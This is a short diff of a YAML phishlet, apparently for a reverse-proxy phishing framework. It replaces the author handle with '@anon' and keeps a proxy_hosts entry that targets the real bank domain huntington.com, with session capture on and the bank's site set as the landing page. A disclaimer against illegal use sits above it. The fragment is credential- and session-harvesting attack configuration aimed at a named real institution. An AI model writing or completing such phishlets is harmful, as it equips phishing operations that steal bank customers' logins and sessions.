@@ -1,6 +1,6 @@
 # THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...
 
-author: '@i_am_a_Good_Human' 
+author: '@anon' 
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'huntington.com', session: true, is_landing: true}
